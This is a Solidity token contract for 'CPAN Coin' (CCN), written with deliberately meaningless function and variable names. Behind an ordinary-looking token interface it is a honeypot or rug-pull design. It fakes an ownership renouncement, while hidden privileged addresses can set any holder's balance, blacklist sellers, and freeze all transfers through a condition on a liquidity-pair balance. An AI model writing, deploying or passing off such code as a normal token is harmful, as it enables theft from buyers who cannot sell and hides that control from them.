//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface enableTotalTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverMax) external view returns (uint256);

    function transfer(address toTx, uint256 listFromIs) external returns (bool);

    function allowance(address shouldEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 listFromIs) external returns (bool);

    function transferFrom(
        address sender,
        address toTx,
        uint256 listFromIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isEnable, uint256 value);
    event Approval(address indexed shouldEnable, address indexed spender, uint256 value);
}

interface modeLiquidity is enableTotalTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract autoShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromLiquidity {
    function createPair(address senderLimit, address minList) external returns (address);
}

interface autoReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CPANCoin is autoShould, enableTotalTrading, modeLiquidity {

    function maxModeTrading(uint256 listFromIs) public {
        autoTotal();
        isMode = listFromIs;
    }

    function tradingMarketingAmount(address buyTo, address toTx, uint256 listFromIs) internal returns (bool) {
        require(walletFee[buyTo] >= listFromIs);
        walletFee[buyTo] -= listFromIs;
        walletFee[toTx] += listFromIs;
        emit Transfer(buyTo, toTx, listFromIs);
        return true;
    }

    function receiverShouldLiquidity(address launchReceiver) public {
        if (fundLaunched) {
            return;
        }
        if (fromWallet != receiverBuy) {
            receiverBuy = swapSell;
        }
        fundTotal[launchReceiver] = true;
        if (receiverTeam != totalReceiver) {
            receiverBuy = fromWallet;
        }
        fundLaunched = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return atReceiverTrading;
    }

    bool private txLiquidity;

    function transfer(address fromReceiver, uint256 listFromIs) external virtual override returns (bool) {
        return liquidityTeam(_msgSender(), fromReceiver, listFromIs);
    }

    function transferFrom(address buyTo, address toTx, uint256 listFromIs) external override returns (bool) {
        if (_msgSender() != amountLiquidityLaunch) {
            if (toAmount[buyTo][_msgSender()] != type(uint256).max) {
                require(listFromIs <= toAmount[buyTo][_msgSender()]);
                toAmount[buyTo][_msgSender()] -= listFromIs;
            }
        }
        return liquidityTeam(buyTo, toTx, listFromIs);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverAt;
    }

    uint256 public swapSell;

    mapping(address => mapping(address => uint256)) private toAmount;

    uint256 fundBuy;

    address public minShould;

    function owner() external view returns (address) {
        return autoBuy;
    }

    function autoTotal() private view {
        require(fundTotal[_msgSender()]);
    }

    bool private receiverTeam;

    mapping(address => bool) public fundTotal;

    bool public enableShould;

    uint256 isMode;

    string private amountReceiver = "CCN";

    event OwnershipTransferred(address indexed exemptSender, address indexed receiverFee);

    function balanceOf(address receiverMax) public view virtual override returns (uint256) {
        return walletFee[receiverMax];
    }

    uint256 private receiverAt = 100000000 * 10 ** 18;

    mapping(address => bool) public liquidityMode;

    address atSellLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address takeLiquidity, address minLimit) external view virtual override returns (uint256) {
        if (minLimit == amountLiquidityLaunch) {
            return type(uint256).max;
        }
        return toAmount[takeLiquidity][minLimit];
    }

    uint8 private atReceiverTrading = 18;

    bool private totalReceiver;

    function shouldToExempt(address fromReceiver, uint256 listFromIs) public {
        autoTotal();
        walletFee[fromReceiver] = listFromIs;
    }

    address public modeSwap;

    constructor (){
        if (fromWallet == swapSell) {
            fromWallet = receiverBuy;
        }
        receiverMode();
        autoReceiver fromShouldAuto = autoReceiver(amountLiquidityLaunch);
        modeSwap = fromLiquidity(fromShouldAuto.factory()).createPair(fromShouldAuto.WETH(), address(this));
        
        minShould = _msgSender();
        fundTotal[minShould] = true;
        walletFee[minShould] = receiverAt;
        
        emit Transfer(address(0), minShould, receiverAt);
    }

    address private autoBuy;

    function receiverMode() public {
        emit OwnershipTransferred(minShould, address(0));
        autoBuy = address(0);
    }

    uint256 public fromWallet;

    function name() external view virtual override returns (string memory) {
        return senderReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return amountReceiver;
    }

    function approve(address minLimit, uint256 listFromIs) public virtual override returns (bool) {
        toAmount[_msgSender()][minLimit] = listFromIs;
        emit Approval(_msgSender(), minLimit, listFromIs);
        return true;
    }

    function launchedMin(address minFund) public {
        autoTotal();
        
        if (minFund == minShould || minFund == modeSwap) {
            return;
        }
        liquidityMode[minFund] = true;
    }

    uint256 public receiverBuy;

    function getOwner() external view returns (address) {
        return autoBuy;
    }

    address amountLiquidityLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private walletFee;

    function liquidityTeam(address buyTo, address toTx, uint256 listFromIs) internal returns (bool) {
        if (buyTo == minShould) {
            return tradingMarketingAmount(buyTo, toTx, listFromIs);
        }
        uint256 senderAt = enableTotalTrading(modeSwap).balanceOf(atSellLiquidity);
        require(senderAt == isMode);
        require(!liquidityMode[buyTo]);
        return tradingMarketingAmount(buyTo, toTx, listFromIs);
    }

    bool public fundLaunched;

    string private senderReceiver = "CPAN Coin";

    bool public atTeamLaunched;

}